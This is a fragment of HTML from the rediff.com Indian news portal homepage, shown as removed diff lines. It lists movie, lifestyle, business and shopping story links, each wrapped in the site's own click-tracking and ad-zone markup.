-                <h2 class="movies" data-boxno="11_1-2_5" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Ffulfilling-salmans-audience-expectations-isnt-easy%2F20230417.htm">
-                    <a href="https://www.rediff.com/movies/report/fulfilling-salmans-audience-expectations-isnt-easy/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Ffulfilling-salmans-audience-expectations-isnt-easy%2F20230417.htm___&position=11_1-2_5&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">'Fulfilling Salman's audience expectations isn't easy'</a>
-                </h2>
-                <p class="alignR">
-                    <a href="https://www.rediff.com/movies" class="morestory" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies___&position=11_1-2_M&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">More Movies</a>
-                </p>
-            </div>
-            <div class="nbox" data-boxno="11_3" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fananyas-sukoon-weekend%2F20230417.htm">
-                <p class="more">
-                    <a class="backmovies" href="https://www.rediff.com/movies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=11_3_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">movies</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/movies/2023/apr/17insta-lead3.jpg" class="img" href="https://www.rediff.com/movies/report/ananyas-sukoon-weekend/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fananyas-sukoon-weekend%2F20230417.htm___&position=11_3_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">
-                        <img alt="Ananya's 'Sukoon' Weekend" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/movies/report/ananyas-sukoon-weekend/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fananyas-sukoon-weekend%2F20230417.htm___&position=11_3_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">Ananya's 'Sukoon' Weekend</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="11_4" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fnushrratt-sreenivas-ready-for-chatrapathi%2F20230418.htm">
-                <p class="more">
-                    <a class="backmovies" href="https://www.rediff.com/movies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=11_4_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">movies</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/movies/2023/apr/18insta-lead1.jpg" class="img" href="https://www.rediff.com/movies/report/nushrratt-sreenivas-ready-for-chatrapathi/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fnushrratt-sreenivas-ready-for-chatrapathi%2F20230418.htm___&position=11_4_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">
-                        <img alt="Nushrratt-Sreenivas Ready For Chatrapathi" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/movies/report/nushrratt-sreenivas-ready-for-chatrapathi/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fnushrratt-sreenivas-ready-for-chatrapathi%2F20230418.htm___&position=11_4_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">Nushrratt-Sreenivas Ready For Chatrapathi</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="11_5" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Frakul-kajol-mouni-say-hello%2F20230417.htm">
-                <p class="more">
-                    <a class="backmovies" href="https://www.rediff.com/movies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=11_5_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">movies</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/movies/2023/apr/16hello-lead3.jpg" class="img" href="https://www.rediff.com/movies/report/rakul-kajol-mouni-say-hello/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Frakul-kajol-mouni-say-hello%2F20230417.htm___&position=11_5_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">
-                        <img alt="Rakul, Nushrratt, Mouni Say Hello!" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/movies/report/rakul-kajol-mouni-say-hello/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Frakul-kajol-mouni-say-hello%2F20230417.htm___&position=11_5_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">Rakul, Nushrratt, Mouni Say Hello!</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="secstorybox getahead">
-                <h3>Get Ahead</h3>
-                <i class="clear"></i>
-                <h2 class="getahead" data-boxno="12_1-2_1" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftime-to-ladder-up-your-fd-deposits%2F20230418.htm">
-                    <a href="https://www.rediff.com/getahead/report/time-to-ladder-up-your-fd-deposits/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Ftime-to-ladder-up-your-fd-deposits%2F20230418.htm___&position=12_1-2_1&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">Time To Ladder Up Your FD Deposits</a>
-                </h2>
-                <h2 class="getahead" data-boxno="12_1-2_2" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Frecipe-my-ammajis-gehun-ka-aaata-ka-halwa-food%2F20230418.htm">
-                    <a href="https://www.rediff.com/getahead/report/recipe-my-ammajis-gehun-ka-aaata-ka-halwa-food/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Frecipe-my-ammajis-gehun-ka-aaata-ka-halwa-food%2F20230418.htm___&position=12_1-2_2&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">Recipe: Ammaji's Gehun Ka Aaata Ka Halwa</a>
-                </h2>
-                <h2 class="getahead" data-boxno="12_1-2_3" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Finformation-you-can-use-savitribai-phule-graduate-scholarship-to-study-at-oxford%2F20230417.htm">
-                    <a href="https://www.rediff.com/getahead/report/information-you-can-use-savitribai-phule-graduate-scholarship-to-study-at-oxford/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Finformation-you-can-use-savitribai-phule-graduate-scholarship-to-study-at-oxford%2F20230417.htm___&position=12_1-2_3&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">How to Get A Scholarship At Oxford</a>
-                </h2>
-                <h2 class="getahead" data-boxno="12_1-2_4" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fhow-to-discuss-money-in-a-new-relationship%2F20230417.htm">
-                    <a href="https://www.rediff.com/getahead/report/how-to-discuss-money-in-a-new-relationship/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fhow-to-discuss-money-in-a-new-relationship%2F20230417.htm___&position=12_1-2_4&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">How To Discuss Money In New Relationship</a>
-                </h2>
-                <h2 class="getahead" data-boxno="12_1-2_5" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Finformation-you-can-use-how-to-apply-for-global-scholarship-program-ais-2023%2F20230413.htm">
-                    <a href="https://www.rediff.com/getahead/report/information-you-can-use-how-to-apply-for-global-scholarship-program-ais-2023/20230413.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Finformation-you-can-use-how-to-apply-for-global-scholarship-program-ais-2023%2F20230413.htm___&position=12_1-2_5&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">A Dream Scholarship To Study Anywhere</a>
-                </h2>
-                <p class="alignR">
-                    <a href="https://www.rediff.com/getahead" class="morestory" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead___&position=12_1-2_M&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">More Get Ahead</a>
-                </p>
-            </div>
-            <div class="nbox" data-boxno="12_3" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Findias-first-apple-store-sneak-peek%2F20230417.htm">
-                <p class="more">
-                    <a class="backgetahead" href="https://www.rediff.com/getahead" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=12_3_L&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">get ahead</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170//getahead/2023/apr/17apple-store-bkc4.jpg" class="img" href="https://www.rediff.com/getahead/report/indias-first-apple-store-sneak-peek/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Findias-first-apple-store-sneak-peek%2F20230417.htm___&position=12_3_I&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">
-                        <img alt="India's First Apple Store: Sneak Peek" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/getahead/report/indias-first-apple-store-sneak-peek/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Findias-first-apple-store-sneak-peek%2F20230417.htm___&position=12_3_T&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">India's First Apple Store: Sneak Peek</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="12_4" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fwhy-is-this-pretty-sikkim-cop-trending%2F20230417.htm">
-                <p class="more">
-                    <a class="backgetahead" href="https://www.rediff.com/getahead" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=12_4_L&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">get ahead</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/getahead/2023/apr/13eksha-kerung12.jpg" class="img" href="https://www.rediff.com/getahead/report/why-is-this-pretty-sikkim-cop-trending/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fwhy-is-this-pretty-sikkim-cop-trending%2F20230417.htm___&position=12_4_I&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">
-                        <img alt="Why Is This Pretty Sikkim Cop Trending?" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/getahead/report/why-is-this-pretty-sikkim-cop-trending/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fwhy-is-this-pretty-sikkim-cop-trending%2F20230417.htm___&position=12_4_T&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">Why Is This Pretty Sikkim Cop Trending?</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="12_5" data-track="label=edit_getahead&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fmiss-india-nandini-guptas-advice-for-young-india%2F20230417.htm">
-                <p class="more">
-                    <a class="backgetahead" href="https://www.rediff.com/getahead" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/getahead___&position=12_5_L&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">get ahead</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/getahead/2023/apr/17nandini-gupta7.jpg" class="img" href="https://www.rediff.com/getahead/report/miss-india-nandini-guptas-advice-for-young-india/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fmiss-india-nandini-guptas-advice-for-young-india%2F20230417.htm___&position=12_5_I&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">
-                        <img alt="Miss India's Advice For Young India" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/getahead/report/miss-india-nandini-guptas-advice-for-young-india/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fmiss-india-nandini-guptas-advice-for-young-india%2F20230417.htm___&position=12_5_T&label=edit_getahead&c_type=edit_getahead&property=hp_in_pc');return false;">Miss India's Advice For Young India</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div id="world_advt_bottom" class="div_advt_bottom">
-                <ins data-revive-zoneid="77" data-revive-source="_blank" data-revive-target="_blank" data-revive-id="4b71f4079fb345c8ac958d0e9f0b56dd" data-zonename="Rediff_Home_728x90_BTF_IN"></ins>
-            </div>
-            <i class="clear"></i>
-            <div class="nbox" data-boxno="13_1" data-track="label=pages&c_type=pages&c_id=2126967">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___http://pages.rediff.com___&position=13_1_L&label=pages&c_type=pages&property=hp_in_pc');return false;" title="More on Pages" href="http://pages.rediff.com">Pages</a>
-                </p>
-                <h5>
-                    <a href="http://pages.rediff.com/pooja-hegde-photos/2126967" onclick="trackURL('https://track.rediff.com/click?url=___http://pages.rediff.com/pooja-hegde-photos/2126967___&position=13_1_I&label=pages&c_type=pages&c_id=2126967&property=hp_in_pc');return false;" data-relsrc="http://socialimg.rediff.com/image.php?pageid=2126967&amp;type=pages" class="img">
-                        <img src="//imworld.rediff.com/worldrediff/pix/blank.gif" alt="Pooja Hegde Photos"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___http://pages.rediff.com/pooja-hegde-photos/2126967___&position=13_1_T&label=pages&c_type=pages&c_id=2126967&property=hp_in_pc');return false;" href="http://pages.rediff.com/pooja-hegde-photos/2126967">Pooja Hegde Photos Kisi Ka Bhai Kisi Ki Jaan Film</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="13_2" data-track="label=redifffoodies&c_type=zarabol&c_id=10505062">
-                <p class="more">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___http%3A%2F%2Fzarabol.rediff.com%2F%23%21RediffFoodies%2F10505062___&position=13_2_L&label=redifffoodies&c_type=zarabol&property=hp_in_pc');return false;" href="http://zarabol.rediff.com/RediffFoodies/10505062">#RediffFoodies</a>
-                </p>
-                <h5>
-                    <a href="http://zarabol.rediff.com/RediffFoodies/10505062" data-relsrc="http://datastore.rediff.com/h250-w250/thumb/605E6C5C6F626C606A627572/p5dbolr92409nfjj.D.0.RediffFoodies01.jpg" class="img" onclick="trackURL('https://track.rediff.com/click?url=___http%3A%2F%2Fzarabol.rediff.com%2F%23%21RediffFoodies%2F10505062___&position=13_2_I&label=redifffoodies&c_type=zarabol&c_id=10505062&property=hp_in_pc');return false;">
-                        <img src="//imworld.rediff.com/worldrediff/pix/blank.gif" alt="RediffFoodies"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a onclick="trackURL('https://track.rediff.com/click?url=___http%3A%2F%2Fzarabol.rediff.com%2F%23%21RediffFoodies%2F10505062___&position=13_2_T&label=redifffoodies&c_type=zarabol&c_id=10505062&property=hp_in_pc');return false;" href="http://zarabol.rediff.com/RediffFoodies/10505062">Share your food pics along with a short description of the food and the place</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="13_3" data-track="label=redifflabs&c_type=labs&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Freport%2Fmapped-meghalaya-nagaland-tripura-2023-constituency-wise%2F20230302.htm">
-                <p class="more">
-                    <a href="https://www.rediff.com/author/REDIFF%20LABS" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/author/REDIFF%20LABS___&position=13_3_L&label=redifflabs&c_type=labs&property=hp_in_pc');return false;">Rediff Labs</a>
-                </p>
-                <h5>
-                    <a data-relsrc="https://im.rediff.com/news/2013/feb/23poll1.jpg?w=670&amp;h=260" class="img" href="https://www.rediff.com/news/report/mapped-meghalaya-nagaland-tripura-2023-constituency-wise/20230302.htm" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news/report/mapped-meghalaya-nagaland-tripura-2023-constituency-wise/20230302.htm___&position=13_3_I&label=redifflabs&c_type=labs&property=hp_in_pc');return false;">
-                        <img alt="MAPPED: Tripura, Meghalaya and Nagaland election 2023, constituency-wise" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a class="black" href="https://www.rediff.com/news/report/mapped-meghalaya-nagaland-tripura-2023-constituency-wise/20230302.htm" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/news/report/mapped-meghalaya-nagaland-tripura-2023-constituency-wise/20230302.htm___&position=13_3_T&label=redifflabs&c_type=labs&property=hp_in_pc');return false;">MAPPED: Tripura, Meghalaya and Nagaland election 2023, constituency-wise</a>
-                    <span class="ht10"></span>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="13_4" data-track="label=videos&c_type=ishare&c_id=11226833">
-                <p class="more">
-                    <a href="https://ishare.rediff.com" class="backvid" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com___&position=13_4_L&label=videos&c_type=ishare&property=hp_in_pc');return false;" title="More on Videos">Videos</a>
-                </p>
-                <h5 class="relative">
-                    <a href="https://ishare.rediff.com/video/others/who-is-guddu-muslim-whose-name-was-the-last-thing-ashraf-uttered/11226833" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/who-is-guddu-muslim-whose-name-was-the-last-thing-ashraf-uttered/11226833___&position=13_4_I&label=videos&c_type=ishare&c_id=11226833&property=hp_in_pc');return false;" data-relsrc="http://datastore.rediff.com/h300-w300/thumb/53615D675B5B615F706460626D72/rdxouu37dxy7hj6v.D.287000.Infamous-for-making-bombs--journey-of-Bombaaz-Guddu-Muslim-to-infamy.mp4-0005.png" class="img vdplayicon">
-                        <img alt="Who is Guddu Muslim whose name was the last thing Ashraf uttered" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://ishare.rediff.com/video/others/who-is-guddu-muslim-whose-name-was-the-last-thing-ashraf-uttered/11226833" onclick="trackURL('https://track.rediff.com/click?url=___https://ishare.rediff.com/video/others/who-is-guddu-muslim-whose-name-was-the-last-thing-ashraf-uttered/11226833___&position=13_4_T&label=videos&c_type=ishare&c_id=11226833&property=hp_in_pc');return false;">Who is Guddu Muslim whose name was the last thing Ashraf uttered</a>
-                </h2>
-            </div>
-            <div id="div_advt_x15" class="nbox">
-                <ins data-revive-zoneid="83" data-revive-source="_blank" data-revive-target="_blank" data-revive-id="4b71f4079fb345c8ac958d0e9f0b56dd" data-zonename="Rediff_Home_200x200_BTF_IN"></ins>
-            </div>
-            <i class="clear"></i>
-            <div class="nbox" data-boxno="14_1" data-track="label=shopping&c_type=shopping&c_id=24925543">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_trend_14_1_L_24925543___&position=14_1_L&label=Shopping&c_type=shopping&c_ic=24925543&property=hp_in_pc');return false;">Shopping</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/27153/b/bbc129e._Mahadev-Enterprises-Orange-And-Black-Kanjiwaram-Silk-Saree-With-Running-Blouse-Pics--Code-BBC129E.jpeg" class="img" href="https://shopping.rediff.com/product/mahadev-enterprises-orange-and-black-kanjiwaram-silk-saree-with-running-blouse-pics--code-bbc129e/24925543" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/mahadev-enterprises-orange-and-black-kanjiwaram-silk-saree-with-running-blouse-pics--code-bbc129e/24925543?sc_cid=inhome_trend_14_1_I_24925543___&position=14_1_I&label=shopping&c_type=shopping&c_id=24925543&property=hp_in_pc');return false;">
-                        <img alt="Mahadev Enterprises Orange And Black Kanjiwaram Silk Saree With Running Blouse Pics ( Code -BBC129E)" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/mahadev-enterprises-orange-and-black-kanjiwaram-silk-saree-with-running-blouse-pics--code-bbc129e/24925543" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/mahadev-enterprises-orange-and-black-kanjiwaram-silk-saree-with-running-blouse-pics--code-bbc129e/24925543?sc_cid=inhome_trend_14_1_T_24925543___&position=14_1_T&label=shopping&c_type=shopping&c_id=24925543&property=hp_in_pc');return false;">Mahadev Enterprises Orange And Black - Rs.949 onwards</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="14_2" data-track="label=shopping&c_type=shopping&c_id=17623155">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_trend_14_2_L_17623155___&position=14_2_L&label=Shopping&c_type=shopping&c_ic=17623155&property=hp_in_pc');return false;">Shopping</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/22393/d/dli3hcf355._Vivan-Creation-Ethnic-Gemstone-Painted-Wooden-Hot-Jewelry-Box-355.jpg" class="img" href="https://shopping.rediff.com/product/vivan-creation-ethnic-gemstone-painted-wooden-hot-jewelry-box-355/17623155" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/vivan-creation-ethnic-gemstone-painted-wooden-hot-jewelry-box-355/17623155?sc_cid=inhome_trend_14_2_I_17623155___&position=14_2_I&label=shopping&c_type=shopping&c_id=17623155&property=hp_in_pc');return false;">
-                        <img alt="Vivan Creation Ethnic Gemstone Painted Wooden Hot Jewelry Box 355" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/vivan-creation-ethnic-gemstone-painted-wooden-hot-jewelry-box-355/17623155" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/vivan-creation-ethnic-gemstone-painted-wooden-hot-jewelry-box-355/17623155?sc_cid=inhome_trend_14_2_T_17623155___&position=14_2_T&label=shopping&c_type=shopping&c_id=17623155&property=hp_in_pc');return false;">Vivan Creation Ethnic Gemstone Painted - Rs.349 onwards</a>
-                </h2>
-            </div>
-            <div id="bdeal_0" class="nbox hide" data-boxno="14_3" data-track="label=bestdeals&c_type=shopping&c_id=31076048">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_best_14_3_L_31076048___&position=14_3_L&label=bestdeals&c_type=shopping&c_id=31076048&property=hp_in_pc');return false;">Best Deals</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/19069/2/20230227._2-in-1-mattress-bed-making-and-lifter-tool-pack-of-2.jpg" class="img" href="https://shopping.rediff.com/product/2-in-1-mattress-bed-making-and-lifter-tool--pack-of-2/31076048" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/2-in-1-mattress-bed-making-and-lifter-tool--pack-of-2/31076048?sc_cid=inhome_best_14_3_I_31076048___&position=14_3_I&label=bestdeals&c_type=shopping&c_id=31076048&property=hp_in_pc');return false;" aria-label="2 in 1 Mattress Bed Making and Lifter Tool - Pack of 2">
-                        <img alt="2 in 1 Mattress Bed Making and Lifter Tool - Pack of 2" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/2-in-1-mattress-bed-making-and-lifter-tool--pack-of-2/31076048" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/2-in-1-mattress-bed-making-and-lifter-tool--pack-of-2/31076048?sc_cid=inhome_best_14_3_T_31076048___&position=14_3_T&label=bestdeals&c_type=shopping&c_id=31076048&property=hp_in_pc');return false;">2 in 1 Mattress Bed Making and Lifter - Rs.349 onwards</a>
-                </h2>
-            </div>
-            <div id="bdeal_1" class="nbox hide" data-boxno="14_4" data-track="label=bestdeals&c_type=shopping&c_id=31076093">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_best_14_4_L_31076093___&position=14_4_L&label=bestdeals&c_type=shopping&c_id=31076093&property=hp_in_pc');return false;">Best Deals</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/27320/r/rudraksha7face3._clickmart-original-5-face-rudraksh-nepali-lab-certified.jpg" class="img" href="https://shopping.rediff.com/product/clickmart-original-5-face-rudraksh-nepali-lab-certified/31076093" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/clickmart-original-5-face-rudraksh-nepali-lab-certified/31076093?sc_cid=inhome_best_14_4_I_31076093___&position=14_4_I&label=bestdeals&c_type=shopping&c_id=31076093&property=hp_in_pc');return false;" aria-label="Clickmart Original 5 Face Rudraksh Nepali Lab Certified">
-                        <img alt="Clickmart Original 5 Face Rudraksh Nepali Lab Certified" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/clickmart-original-5-face-rudraksh-nepali-lab-certified/31076093" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/clickmart-original-5-face-rudraksh-nepali-lab-certified/31076093?sc_cid=inhome_best_14_4_T_31076093___&position=14_4_T&label=bestdeals&c_type=shopping&c_id=31076093&property=hp_in_pc');return false;">Clickmart Original 5 Face Rudraksh - Rs.2100 onwards</a>
-                </h2>
-            </div>
-            <div id="bkbox_banner" class="nbox hide" data-boxno="14_5" data-track=""></div>
-            <i class="clear"></i>
-            <div class="secstorybox business">
-                <h3>Business</h3>
-                <i class="clear"></i>
-                <h2 class="business" data-boxno="15_1-2_1" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fauto-market-share-of-maruti-hyundai-slipped-in-fy23-on-chip-woes%2F20230418.htm">
-                    <a href="https://www.rediff.com/business/report/auto-market-share-of-maruti-hyundai-slipped-in-fy23-on-chip-woes/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fauto-market-share-of-maruti-hyundai-slipped-in-fy23-on-chip-woes%2F20230418.htm___&position=15_1-2_1&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">Market share of Maruti, Hyundai slipped in FY23</a>
-                </h2>
-                <h2 class="business" data-boxno="15_1-2_2" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fair-india-revises-pilots-cabin-crew-salaries-announces-reward-bonus%2F20230418.htm">
-                    <a href="https://www.rediff.com/business/report/air-india-revises-pilots-cabin-crew-salaries-announces-reward-bonus/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fair-india-revises-pilots-cabin-crew-salaries-announces-reward-bonus%2F20230418.htm___&position=15_1-2_2&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">Air India revises pilots', cabin crew salaries</a>
-                </h2>
-                <h2 class="business" data-boxno="15_1-2_3" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fblinkit-permanently-shuts-some-dark-stores-amid-worker-strike%2F20230418.htm">
